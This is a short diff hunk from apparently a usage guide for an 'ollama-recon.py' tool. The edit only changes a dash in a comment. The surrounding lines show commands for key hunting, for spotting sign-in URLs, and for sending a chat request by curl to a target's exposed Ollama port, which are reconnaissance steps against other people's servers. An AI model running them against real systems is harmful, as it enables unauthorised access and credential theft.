@@ -66,7 +66,7 @@ python3 ollama-recon.py --limit 200
 python3 ollama-recon.py --keyhunt
 # Look for [!!!] SIGNIN URL in output
 
-# 3. Trigger manually if needed — send any chat request to a cloud model
+# 3. Trigger manually if needed - send any chat request to a cloud model
 curl -s -X POST http://<target>:11434/api/chat \
   -H "Content-Type: application/json" \
   -d '{
